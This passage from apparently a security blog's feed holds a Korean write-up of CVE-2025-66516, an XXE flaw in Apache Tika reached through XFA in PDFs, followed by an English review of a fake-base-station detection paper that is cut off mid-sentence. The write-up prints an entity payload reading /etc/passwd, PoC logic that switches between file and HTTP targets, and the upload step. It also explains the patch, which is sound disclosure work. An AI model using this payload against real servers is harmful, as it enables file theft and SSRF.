&#xC758;&#xB3C4;&#xB294; &#xCC28;&#xB2E8;</span><span class="hljs-keyword">return</span> factory;}</code></pre><p>&#xADF8;&#xB7F0;&#xB370; &#xC5EC;&#xAE30;&#xC11C; &#xC0AC;&#xC6A9;&#xB41C; <code>IGNORING_STAX_ENTITY_RESOLVER</code>&#xAC00; &#xC6D0;&#xB798; &#xAE30;&#xB300;&#xB418;&#xB294; &#xBC18;&#xD658; &#xD0C0;&#xC785;(InputStream &#xACC4;&#xC5F4;)&#xC774; &#xC544;&#xB2C8;&#xB77C; String&#xC744; &#xBC18;&#xD658;&#xD558;&#xB294; &#xD615;&#xD0DC;&#xC600;&#xACE0;, JDK &#xAE30;&#xBCF8; StAX &#xAD6C;&#xD604;&#xCCB4;&#xB294; &#xC774; &#xD0C0;&#xC785; &#xBD88;&#xC77C;&#xCE58;&#xB97C; &#xC870;&#xC6A9;&#xD788; &#xBB34;&#xC2DC;&#xD55C; &#xB4A4; &#xAE30;&#xBCF8; &#xB3D9;&#xC791;&#xC73C;&#xB85C; fallback &#xD574;&#xBC84;&#xB9BD;&#xB2C8;&#xB2E4;.</p><p>&#xC989;, &#xC544;&#xB798;&#xCC98;&#xB7FC; XFA &#xC548;&#xC5D0; &#xC678;&#xBD80; &#xC5D4;&#xD2F0;&#xD2F0;&#xAC00; &#xB4E4;&#xC5B4;&#xAC00; &#xC788;&#xC73C;&#xBA74;</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xdp</span>:xdp [</span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxeSYSTEM</span><span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><span class="hljs-meta">]&gt;</span></code></pre><p>resolver&#xAC00; &#xC81C;&#xB300;&#xB85C; &#xB9C9;&#xC544;&#xC8FC;&#xC9C0; &#xBABB;&#xD55C; &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB294; &#xD30C;&#xC11C;&#xAC00; &#xC678;&#xBD80; &#xC5D4;&#xD2F0;&#xD2F0;&#xB97C; &#xADF8;&#xB300;&#xB85C; &#xD574;&#xC11D;&#xD558;&#xBA74;&#xC11C; &#xB85C;&#xCEEC; &#xD30C;&#xC77C; &#xC77D;&#xAE30;(file://) &#xB610;&#xB294; HTTP &#xC694;&#xCCAD;(SSRF) &#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="parser-implementation-&#xCC28;&#xC774;&#xC5D0;-&#xB530;&#xB978;-&#xC601;&#xD5A5;"><a href="#parser-implementation-&#xCC28;&#xC774;&#xC5D0;-&#xB530;&#xB978;-&#xC601;&#xD5A5;" class="headerlink" title="parser implementation &#xCC28;&#xC774;&#xC5D0; &#xB530;&#xB978; &#xC601;&#xD5A5;"></a>parser implementation &#xCC28;&#xC774;&#xC5D0; &#xB530;&#xB978; &#xC601;&#xD5A5;</h3><ul><li>tika-server-standard.jar: Woodstox(StAX &#xAD6C;&#xD604;&#xCCB4;)&#xAC00; &#xD568;&#xAED8; &#xBC88;&#xB4E4;&#xB418;&#xB294; &#xAD6C;&#xC131;&#xC774;&#xB77C;, resolver &#xCC98;&#xB9AC; &#xCABD;&#xC5D0;&#xC11C; &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xC678;&#xBD80; &#xC5D4;&#xD2F0;&#xD2F0;&#xAC00; &#xB9C9;&#xD788;&#xB294; &#xCF00;&#xC774;&#xC2A4;&#xAC00; &#xB9CE;&#xC544; &#xC601;&#xD5A5;&#xC774; &#xB0AE;&#xAC70;&#xB098; &#xC7AC;&#xD604;&#xC774; &#xC548; &#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xC0AC;&#xC6A9;(tika-core + parser &#xBAA8;&#xB4C8;): &#xD074;&#xB798;&#xC2A4;&#xD328;&#xC2A4;/&#xB7F0;&#xD0C0;&#xC784; &#xAD6C;&#xC131;&#xC5D0; &#xB530;&#xB77C; JDK &#xAE30;&#xBCF8; StAX &#xB85C; &#xB3D9;&#xC791;&#xD558;&#xBA74;, &#xC704; &#xD0C0;&#xC785; &#xBD88;&#xC77C;&#xCE58; &#xBB34;&#xC2DC; &#x2192; fallback&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xBA74;&#xC11C; &#xCDE8;&#xC57D;&#xD574;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>&#xACF5;&#xAC1C; PoC(<a href="https://github.com/chasingimpact/CVE-2025-66516-Writeup-POC/blob/main/poc/exploit.py)&#xC758;">https://github.com/chasingimpact/CVE-2025-66516-Writeup-POC/blob/main/poc/exploit.py)&#xC758;</a> &#xD575;&#xC2EC;&#xC740; XFA&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xCD5C;&#xC18C; &#xAD6C;&#xC870;&#xC758; PDF&#xB97C; &#xB9CC;&#xB4E4;&#xACE0;, &#xADF8; &#xC548;&#xC5D0;&#xC11C; XXE&#xAC00; &#xC2E4;&#xC81C; &#xCD94;&#xCD9C; &#xACBD;&#xB85C;&#xB97C; &#xD0C0;&#xB3C4;&#xB85D; &#xAD6C;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>XFA &#xB0B4;&#xBD80;&#xC5D0; XXE &#xC5D4;&#xD2F0;&#xD2F0; &#xC8FC;&#xC785;</strong></p></blockquote><p>PoC&#xB294; &#xBA3C;&#xC800; XFA XML&#xC5D0; &#xC678;&#xBD80; &#xC5D4;&#xD2F0;&#xD2F0;&#xB97C; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">if</span> target.startswith(<span class="hljs-string">&quot;http://&quot;</span>)<span class="hljs-keyword">or</span> target.startswith(<span class="hljs-string">&quot;https://&quot;</span>):    entity_uri = target<span class="hljs-keyword">else</span>:    entity_uri =<span class="hljs-string">f&quot;file://<span class="hljs-subst">{target}</span>&quot;</span></code></pre><p>&#xC774; &#xAC12;&#xC740; XFA XML&#xC758; <code>&lt;!ENTITY &#x2026; SYSTEM &#x201C;&#x2026;&quot;&gt;</code>&#xB85C; &#xC120;&#xC5B8;&#xB418;&#xBA70;, &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xC2E4;&#xC81C; &#xCD9C;&#xB825;&#xB418;&#xB294; &#xD544;&#xB4DC; &#xC704;&#xCE58;&#xC5D0;&#xC11C; &#xCC38;&#xC870;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xdp</span>:xdp [</span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxeSYSTEM</span><span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><span class="hljs-meta">]&gt;</span>...<span class="hljs-tag">&lt;<span class="hljs-name">text</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span>...<span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span></code></pre><p>&#xAC70;&#xAE30;&#xC5D0; &#xBCF5;&#xC7A1;&#xD55C; PDF &#xAE30;&#xB2A5;&#xC740; &#xC4F0;&#xC9C0; &#xC54A;&#xACE0;, AcroForm + XFA Stream&#xB9CC; &#xD3EC;&#xD568;&#xD55C; &#xCD5C;&#xC18C; &#xAD6C;&#xC870;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; XFA XML&#xC744; &#xD558;&#xB098;&#xC758; &#xC2A4;&#xD2B8;&#xB9BC; &#xAC1D;&#xCCB4;&#xB85C; &#xC0BD;&#xC785;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript">/AcroForm <span class="hljs-number">5</span> <span class="hljs-number">0</span> R<span class="hljs-number">5</span> <span class="hljs-number">0</span> obj ... /XFA <span class="hljs-number">6</span> <span class="hljs-number">0</span> R ...<span class="hljs-number">6</span> <span class="hljs-number">0</span> obj ... stream (XFA XML)</code></pre><p>&#xC774; &#xAD6C;&#xC870;&#xB9CC;&#xC73C;&#xB85C; Tika&#xB294; XFA&#xAC00; &#xD3EC;&#xD568;&#xB41C; PDF&#xB85C; &#xC778;&#xC2DD;&#xD558;&#xACE0; XFA XML &#xD30C;&#xC2F1; &#xACBD;&#xB85C;&#xC5D0; &#xC9C4;&#xC785;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p><code>/tika</code> <strong>&#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB85C; PDF &#xC5C5;&#xB85C;&#xB4DC; &#xBC0F; &#xB370;&#xC774;&#xD130; &#xC720;&#xCD9C;</strong></p></blockquote><p>&#xC0DD;&#xC131;&#xB41C; PDF&#xB294; Tika Server&#xC758; REST &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC5D0; &#xC804;&#xC1A1;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">PUT /tikaContent-Type: application/pdf</code></pre><p>Tika&#xC758; &#xC751;&#xB2F5;&#xC5D0;&#xB294; XFA &#xD3FC; &#xD544;&#xB4DC;&#xAC00; HTML/XML &#xD615;&#xD0DC;&#xB85C; &#xD3EC;&#xD568;&#xB418;&#xACE0;, PoC&#xB294; &#xADF8; &#xC911; <code>data</code> &#xD544;&#xB4DC;&#xC5D0; &#xCD9C;&#xB825;&#xB41C; &#xAC12;&#xC744; &#xC815;&#xADDC;&#xC2DD;&#xC73C;&#xB85C; &#xCD94;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">fieldName=<span class="hljs-string">&quot;data&quot;</span>&gt;data: ...</code></pre><p>XXE&#xAC00; &#xC131;&#xACF5;&#xD588;&#xB2E4;&#xBA74;, &#xC774; &#xC704;&#xCE58;&#xC5D0; <code>/etc/passwd</code> &#xB0B4;&#xC6A9;&#xC774;&#xB098; SSRF &#xC751;&#xB2F5;&#xC774; &#xADF8;&#xB300;&#xB85C; &#xB178;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p>Tika 3.2.2&#xC5D0;&#xC11C;&#xB294; resolver&#xB85C; &#xC6B0;&#xD68C; &#xCC28;&#xB2E8;&#xC5D0; &#xAE30;&#xB300;&#xC9C0; &#xC54A;&#xACE0;, factory &#xB808;&#xBCA8;&#xC5D0;&#xC11C; DTD/&#xC678;&#xBD80; &#xC5D4;&#xD2F0;&#xD2F0; &#xAE30;&#xB2A5;&#xC744; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xAEBC;&#xBC84;&#xB9AC;&#xB294; &#xBC29;&#xD5A5;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD575;&#xC2EC; &#xBCC0;&#xACBD;&#xC810;&#xC740; &#xC544;&#xB798; 2&#xAC00;&#xC9C0;&#xC785;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>DTD &#xC9C0;&#xC6D0; &#xBE44;&#xD65C;&#xC131;&#xD654;</strong></p></blockquote><pre><code class="hljs java">tryToSetStaxProperty(factory, XMLInputFactory.SUPPORT_DTD,<span class="hljs-keyword">false</span>);</code></pre><blockquote><p><strong>&#xC678;&#xBD80; &#xC5D4;&#xD2F0;&#xD2F0; &#xD574;&#xC11D; &#xBE44;&#xD65C;&#xC131;&#xD654;</strong></p></blockquote><pre><code class="hljs java">tryToSetStaxProperty(factory, XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES,<span class="hljs-keyword">false</span>);</code></pre><p>&#xADF8;&#xB9AC;&#xACE0; &#xBD80;&#xAC00;&#xC801;&#xC73C;&#xB85C;, &#xAE30;&#xC874; <code>IGNORING_STAX_ENTITY_RESOLVER</code>&#xB3C4; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xBC18;&#xD658; &#xD0C0;&#xC785;(InputStream &#xACC4;&#xC5F4;)&#xC744; &#xBC18;&#xD658;&#xD558;&#xB3C4;&#xB85D; &#xC218;&#xC815;&#xB418;&#xC5B4; JDK &#xAE30;&#xBCF8; StAX&#xAC00; &#xBB34;&#xC2DC;&#xD558;&#xACE0; fallback&#xD558;&#xB294; &#xD750;&#xB984;&#xC744; &#xB354; &#xC774;&#xC0C1; &#xD0C0;&#xC9C0; &#xC54A;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-66516">NVD - CVE-2025-66516</a></li><li><a href="https://github.com/Ashwesker/Blackash-CVE-2025-66516">https://github.com/Ashwesker/Blackash-CVE-2025-66516</a></li><li><a href="https://github.com/chasingimpact/CVE-2025-66516-Writeup-POC">https://github.com/chasingimpact/CVE-2025-66516-Writeup-POC</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/SSRF/">SSRF</category>
      
      <category domain="https://hackyboiz.github.io/tags/Apache-Tika/">Apache Tika</category>
      
      <category domain="https://hackyboiz.github.io/tags/XML-External-Entity/">XML External Entity</category>
      
      <category domain="https://hackyboiz.github.io/tags/XXE/">XXE</category>
      
      <category domain="https://hackyboiz.github.io/tags/XFA/">XFA</category>
      
      <category domain="https://hackyboiz.github.io/tags/gongjae/">gongjae</category>
      
      
      <comments>https://hackyboiz.github.io/2025/12/24/gongjae/CVE-2025-66516/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] “Gotta Detect &#39;Em All: Fake Base Station and Multi-Step Attack Detection in Cellular Networks” Paper Review (EN)</title>
      <link>https://hackyboiz.github.io/2025/12/21/clalxk/fbs_paper_review_en/</link>
      <guid>https://hackyboiz.github.io/2025/12/21/clalxk/fbs_paper_review_en/</guid>
      <pubDate>Sun, 21 Dec 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello! I&amp;#x2019;m clalxk.&lt;/p&gt;
&lt;p&gt;It&amp;#x2019;s been a busy year-end (two schools&amp;#x2026;), so I&amp;#x2019;m back with a paper review&amp;#x2026; h</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello! I&#x2019;m clalxk.</p><p>It&#x2019;s been a busy year-end (two schools&#x2026;), so I&#x2019;m back with a paper review&#x2026; haha.</p><p>In this post, I&#x2019;ll review a paper that detects <strong>Fake Base Stations (FBS)</strong>&#x2014;a threat that remains very realistic in cellular networks&#x2014;and the <strong>Multi-Step Attacks (MSA)</strong> that are launched using them as a foothold, <strong>from the User Equipment (UE) side</strong>. This paper was presented at <strong>USENIX Security 2025A</strong> (<a href="https://www.usenix.org/system/files/usenixsecurity25-mubasshir.pdf">link</a>).</p><p>The paper proposes <strong>FBSDetector</strong>, an ML-based detection framework, and describes an ML-based detection solution that leverages <strong>Layer-3 network traces</strong> on the UE (User Equipment) to respond to the severe security threats posed by FBS and multi-step attacks (MSA). Based on the first large-scale, high-quality <strong>FBSAD</strong> and <strong>MSAD</strong> datasets built to reflect realistic scenarios via POWDER, the solution integrates <strong>stateful LSTM with attention</strong> for FBS detection and <strong>graph learning</strong> for MSA recognition. FBSDetector achieves <strong>96% accuracy</strong> with a <strong>2.96% false positive rate</strong> for FBS, and <strong>86% accuracy</strong> with a <strong>3.28% false positive rate</strong> for MSA, and was deployed as a mobile app and validated in real-world settings with low overhead.</p><h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>Among cellular network attacks, the reason FBS (illegal/rogue base stations) are scary is simple. By <strong>pretending to be a legitimate base station (impersonation)</strong>, an attacker can lure the UE, and then mix in various attacks (DoS, downgrade, location tracking, etc.) so that they look like normal &#x201C;protocol procedures.&#x201D;</p><p>The threat posed by FBS is not new and has existed for a long time, but it is still widely used by attackers around the world.</p><ul><li><strong>Standard/spec-level defenses are slow</strong>: It takes a long time for a new defense to be incorporated into standards and propagate to chipsets/devices/networks.</li><li><strong>There are already too many vulnerable devices worldwide</strong>: Replacing them is not realistic.</li><li><strong>Limitations of existing detection</strong><ul><li>Heuristic/signature-based approaches are weak against adaptive attackers (slightly tweaking fields or changing the order&#x2026;?).</li><li>Crowdsourcing/external hardware dependence is hard to deploy at scale or is costly.</li><li>Approaches that only look at lower layers (physical/wireless) struggle to cover sophisticated FBS and MSA.</li></ul></li></ul><p>The paper goes one step further and emphasizes that it&#x2019;s hard to conclude &#x201C;it&#x2019;s safe because it&#x2019;s 5G.&#x201D; While IMSIs were used unencrypted in 4G, there is still room for FBS to be used for attacks in 5G, and recently proposed certificate/signature-based defenses introduce not only <strong>overhead</strong> and <strong>spec changes</strong>, but also <strong>key-sharing issues in roaming environments</strong>.</p><p>It also argues that while Google/Apple have adopted new approaches to neutralize FBS, outside that scope, knowledgeable attackers with equipment can still operate&#x2014;so <strong>detection itself</strong> is necessary.</p><p>Therefore, this paper heads toward: &#x201C;Then, using only the <strong>Layer-3 traces (NAS/RRC)</strong> that the UE already sees, let&#x2019;s catch this on-device at low cost.&#x201D;</p><blockquote><p>NAS: control-plane protocol between UE &#x2194; core (EPC)</p><p>RRC: control-plane protocol between UE &#x2194; base station (eNodeB)</p><p>MSA: an attack that uses FBS as a foothold and chains multiple procedures/messages to achieve an end goal (DoS/tracking/downgrade, etc.)</p></blockquote><hr><h1 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h1><h2 id="0-System-Overview"><a href="#0-System-Overview" class="headerlink" title="0. System Overview"></a>0. System Overview</h2><p>The overall flow is: &#x201C;(1) build the dataset &#x2192; (2) two-stage FBS detection &#x2192; (3) graph-based MSA recognition &#x2192; (4) fuse NAS/RRC predictions &#x2192; (5) deploy as an app.&#x201D;</p><p><img src="/2025/12/21/clalxk/fbs_paper_review_en/figure2_fbsdetector_architecture.png" alt="Figure 2: FBSDetector overall architecture"></p><p>Figure 2: FBSDetector overall architecture</p><p><em>Figure 2: Overview of FBSDetector, including dataset construction / ML framework / deployment</em></p><hr><h2 id="1-Threat-Model-amp-Scope"><a href="#1-Threat-Model-amp-Scope" class="headerlink" title="1. Threat Model &amp; Scope"></a>1. Threat Model &amp; Scope</h2><p>The attacker model assumed in the paper can be summarized as follows.</p><ul><li>Impersonate a legitimate BS and <strong>induce UE reselection with a stronger signal</strong></li><li><strong>Learn/imitate</strong> legitimate values by eavesdropping on public channels</li><li>Not at the level of breaking crypto itself or physically tampering with the SIM/core/BS equipment</li><li>But can try to evade detection via <strong>rapid parameter changes</strong>, <strong>transmit power control</strong>, <strong>obfuscation</strong>, etc.</li></ul><p>The deployment scope focuses on <strong>4G (LTE)</strong>. The reasons are (1) 4G is still widely deployed in practice, and (2) the experimental infrastructure (POWDER) needed to build the dataset supports 4G experiments well.</p><p>The paper&#x2019;s &#x201C;design challenges&#x201D; can be summarized into the following five items.</p><ul><li><strong>Dataset availability/quality (C1)</strong>: It is hard to obtain realistic data that includes legitimate BS/FBS/MSA.</li><li><strong>FBS detection from packet traces (C2)</strong>: The same message can be benign/malicious depending on context.</li><li><strong>MSA recognition (C3)</strong>: Multi-step patterns are complex and evolve.</li><li><strong>NAS/RRC prediction fusion (C4)</strong>: How to combine layer-specific models into a single decision.</li><li><strong>Real-time detection (C5)</strong>: Must enable fast capture/processing/inference on-device.</li></ul><hr><h2 id="2-TAU-Reject-FBS-based-MSA"><a href="#2-TAU-Reject-FBS-based-MSA" class="headerlink" title="2. TAU Reject (FBS-based MSA)"></a>2. TAU Reject (FBS-based MSA)</h2><p>One representative attack described in the paper is <strong>TAU Reject</strong>. It may look like a &#x201C;procedure message,&#x201D; but in practice it can drive the UE into an <strong>out-of-service</strong> state or trigger downgrades, etc.</p><p>The key points are:</p><ul><li>The FBS lures the UE using a <strong>strong signal</strong> and <strong>reselection priority</strong>.</li><li>To make the UE appear to have detected a new TA, the FBS operates with a <strong>different TAC</strong>.</li><li>When the UE requests a TAU, the FBS sends a <strong>TrackingAreaUpdateReject</strong> to achieve the goal.</li></ul><p><img src="/2025/12/21/clalxk/fbs_paper_review_en/figure1_tau_reject_attack.png" alt="Figure 1: TAU Reject attack flow"></p><p>Figure 1: TAU Reject attack flow</p><p><em>Figure 1: TAU Reject flow (lure UE to FBS &#x2192; inject Reject during TAU procedure &#x2192; impact connectivity/service)</em></p><hr><h2 id="3-Dataset-FBSAD-MSAD-POWDER-based"><a href="#3-Dataset-FBSAD-MSAD-POWDER-based" class="headerlink" title="3. Dataset: FBSAD / MSAD (POWDER-based)"></a>3. Dataset: FBSAD / MSAD (POWDER-based)</h2><p>One strength of this paper is that it <strong>constructs the dataset to be close to real-world conditions</strong>. Because running FBS experiments in public places is illegal, the paper builds the dataset on the POWDER testbed based on <strong>real over-the-air (OTA) packets</strong>.</p><ul><li><strong>FBSAD</strong>: for FBS detection</li><li><strong>MSAD</strong>: for recognizing 21 MSAs</li><li>Total 9.2GB (raw), including mobility and attacker capability levels (0&#x2013;4)</li></ul><p>The attacker capability levels are also quite detailed.</p><ul><li><strong>Level 0</strong>: &#x201C;Simple operation with high signal strength&#x201D;</li><li><strong>Level 1</strong>: &#x201C;Signal strength tuned to be ideal for inducing handover/reselection&#x201D;</li><li><strong>Level 2</strong>: Replicate legitimate BS parameters (cell ID, MCC/MNC, TAC, PCI, RF parameters, SSB/TA, etc.)</li><li><strong>Level 3</strong>: Perform common MSAs based on Level 2</li><li><strong>Level 4</strong>: Adaptive reconfiguration for evasion, such as <strong>field changes / time-order changes</strong></li></ul><h3 id="3-1-Data-generation-What-did-they-do-on-POWDER"><a href="#3-1-Data-generation-What-did-they-do-on-POWDER" class="headerlink" title="3-1. Data generation (What did they do on POWDER?)"></a>3-1. Data generation (What did they do on POWDER?)</h3><p>On POWDER, the paper constructs a cellular network that integrates legitimate BS/FBS and MSA, and collects traces by <strong>capturing packets at all cellular network components</strong>. It also clearly explains why mobility (UE moving and handovers occurring) is included in the dataset: without it, <strong>normal handovers could be misclassified as malicious</strong>.</p><p>From an implementation standpoint, they use <strong>Open5GS</strong> for the core network, and both <strong>srsRAN</strong> and <strong>OpenAirInterface (OAI)</strong> for the UE/BS stack to reduce bias toward a specific implementation.</p><h3 id="3-2-Preprocessing-protocol-filtering-amp-features"><a href="#3-2-Preprocessing-protocol-filtering-amp-features" class="headerlink" title="3-2. Preprocessing (protocol filtering &amp; features)"></a>3-2. Preprocessing (protocol filtering &amp; features)</h3><p>Since each packet in the trace contains multiple protocol layers, the paper performs <strong>protocol filtering to keep only NAS/RRC</strong>, and then extracts relevant field values.</p><ul><li><strong>NAS layer</strong>: 119 fields</li><li><strong>RRC layer</strong>: 183 fields</li></ul><p>These fields are used as input features for model training.</p><h3 id="3-3-Labeling-benign-malicious-and-attack-types"><a href="#3-3-Labeling-benign-malicious-and-attack-types" class="headerlink" title="3-3. Labeling (benign/malicious, and attack types)"></a>3-3. Labeling (benign/malicious, and attack types)</h3><p>Labeling is done based on &#x201C;why was this packet generated?&#x201D;</p><ul><li><strong>FBSAD (binary label)</strong>: 0 for benign packets, 1 for packets generated by the FBS</li><li><strong>MSAD (multi-class label)</strong>: 0 for benign packets, and packets generated by attack (<code>attack_j</code>) are labeled as <code>LA[attack_j]</code></li></ul><p>Because there are fewer NAS packets, they manually labeled them by inspecting each packet (the paper says it was a one-time effort of about ~2 hours). For RRC packets, they detect the attack interval from NAS traces and then batch-label them with an automated script based on that interval.</p><hr><h2 id="4-FBS-detection-two-stage-packet-&#x2192;-trace"><a href="#4-FBS-detection-two-stage-packet-&#x2192;-trace" class="headerlink" title="4. FBS detection: two-stage (packet &#x2192; trace)"></a>4. FBS detection: two-stage (packet &#x2192; trace)</h2><p>A nice intuition in the paper is reflecting the idea that rather than a packet itself being malicious, often it&#x2019;s the <strong>context in which the packet appears (preceding/following context / sequence)</strong> that is malicious.</p><p>So FBS detection proceeds in two stages.</p><ol><li><strong>Packet-level classification</strong></li></ol><ul><li>Classify each packet as benign/suspicious</li><li>Predict using a combined <strong>Stateful LSTM + Attention</strong> structure in parallel</li></ul><ol><li><strong>Trace-level classification</strong></li></ol><ul><li>Decide &#x201C;is this trace an FBS session?&#x201D; based on packet sequence order/patterns</li><li>Avoid a naive heuristic where a single malicious packet flags the entire trace</li></ul><p>To add a bit more detail: for packet-level modeling, <strong>stateful LSTM</strong> preserves long-term dependencies by maintaining state across batches, and <strong>attention</strong> learns to place higher weight on decisive parts of the sequence. The two outputs are extracted in parallel and combined (concat/merge), then the final class is predicted through dense layers.</p><p>In particular, the analysis showing performance changes depending on sequence length was interesting (and it&#x2019;s also a part people often struggle with when tuning models).</p><p><img src="/2025/12/21/clalxk/fbs_paper_review_en/figure6_sequence_length.png" alt="Figure 6: Sequence length distribution and performance"></p><p>Figure 6: Sequence length distribution and performance</p><p><em>Figure 6: Trend that performance improves around sequence lengths 9&#x2013;15 for NAS and 80&#x2013;120 for RRC</em></p><hr><h2 id="5-MSA-recognition-learning-&#x201C;patterns&#x201D;-with-graphs"><a href="#5-MSA-recognition-learning-&#x201C;patterns&#x201D;-with-graphs" class="headerlink" title="5. MSA recognition: learning &#x201C;patterns&#x201D; with graphs"></a>5. MSA recognition: learning &#x201C;patterns&#x201D; with graphs</h2><p>MSA is not just &#x201C;a few messages&#x201D;; it is closer to a <strong>pattern of chained procedures</strong>. The paper represents this as a graph.</p><ul><li>Nodes: unique values of message types (e.g., NAS: <code>nas_eps_nas_msg_emm_type_value</code>, RRC: <code>lterrc_c1_showname</code>)</li><li>Edges: transitions to the next message (directed), and labels for whether the transition is benign/attack</li></ul><p>Among the evaluated graph models, <strong>GraphSAGE</strong> performed best, so they use it.</p><p><img src="/2025/12/21/clalxk/fbs_paper_review_en/figure3_graph_msa_detection.png" alt="Figure 3: Example graph representation for MSA detection"></p><p>Figure 3: Example graph representation for MSA detection</p><p>Figure 3 shows that attacks such as TAU Reject appear as &#x201C;path patterns,&#x201D; and the system learns these patterns to recognize MSA. For the &#x201C;what if the attack evolves?&#x201D; problem, the paper proposes a direction that leverages ideas like <strong>maximum common subgraphs</strong>, using the intuition that it&#x2019;s often not a completely new path, but partially overlapping.</p><p>The paper also explains this more formally. If a packet-derived graph is represented as (G=(V,E)), known attacks appear as specific paths (P(G)) in the graph, and evolved/reconfigured attacks may appear as different paths (P&#x2019;(G)). However, due to vulnerability/procedure characteristics, it is likely that these paths are not completely disjoint and may partially overlap. The intuition is to leverage this &#x201C;overlap&#x201D; to detect unknown attacks.</p><hr><h2 id="6-NAS-RRC-prediction-fusion-weight-based-fusion"><a href="#6-NAS-RRC-prediction-fusion-weight-based-fusion" class="headerlink" title="6. NAS/RRC prediction fusion (weight-based fusion)"></a>6. NAS/RRC prediction fusion (weight-based fusion)</h2><p>Because NAS and RRC have different characteristics, the models are trained separately and then their predictions are fused at the end using a <strong>weight-based</strong> method. (The paper mentions Dempster&#x2013;Shafer theory and explains it as assigning higher weight to the more reliable side.)</p><p>Experimentally, fusing NAS+RRC predictions improved performance by about <strong>1&#x2013;2%</strong>.</p><hr><h2 id="7-Deployment-distributing-as-a-mobile-app"><a href="#7-Deployment-distributing-as-a-mobile-app" class="headerlink" title="7. Deployment: distributing as a mobile app"></a>7. Deployment: distributing as a mobile app</h2><p>Rather than stopping at experiments, they deployed it as an app and measured overhead.</p><ul><li><strong>MobileInsight</strong>: baseband trace parsing</li><li><strong>TensorFlow Lite</strong>: on-device inference</li><li><strong>Flutter</strong>: app UI</li></ul><p>They also mention practical barriers such as rooting requirements. Additionally, assuming real deployment, they anticipate an operational model where models are periodically retrained to reflect new attacks and quickly deployed via app updates. Since NAS/RRC traces can be sensitive, they also note that data collection should be enabled based on user consent.</p><hr><h1 id="Performance-Analysis"><a href="#Performance-Analysis" class="headerlink" title="Performance Analysis"></a>Performance Analysis</h1><p>To summarize the key results first:</p><ul><li><strong>FBS detection</strong>: 96% accuracy, 2.96% FPR</li><li><strong>MSA recognition (21 types)</strong>: 86% accuracy, 3.28% FPR</li><li>1&#x2013;2% improvement from NAS/RRC fusion</li><li>Reported <strong>86%</strong> zero-shot detection accuracy for <strong>overshadowing attacks</strong></li></ul><p>The following figure is the core of the overhead analysis.</p><p><img src="/2025/12/21/clalxk/fbs_paper_review_en/figure4_overhead_analysis.png" alt="Figure 4: Overhead analysis"></p><p>Figure 4: Overhead analysis</p><p><em>Figure 4: Time/power/memory usage increases linearly with packet count, but with a small slope, suggesting practical usability</em></p><p>The paper also presents quantitative numbers: on average it runs at about <strong>835KB memory</strong> and <strong>&lt;2mW power</strong>, which is relatively low compared to prior approaches (~4mW).</p><p>They also show that certain attack types contribute more heavily to false positives in MSA (cases that are almost indistinguishable from benign behavior from the UE&#x2019;s perspective), and provide an analysis figure.</p><p><img src="/2025/12/21/clalxk/fbs_paper_review_en/figure5_fp_analysis.png" alt="Figure 5: False positive analysis for MSA detection"></p><p>Figure 5: False positive analysis for MSA detection</p><p><em>Figure 5: Certain attack types contribute heavily to FP &#x2192; the root cause is that they &#x201C;look the same as benign behavior from the UE&#x2019;s perspective&#x201D;</em></p><p>They also 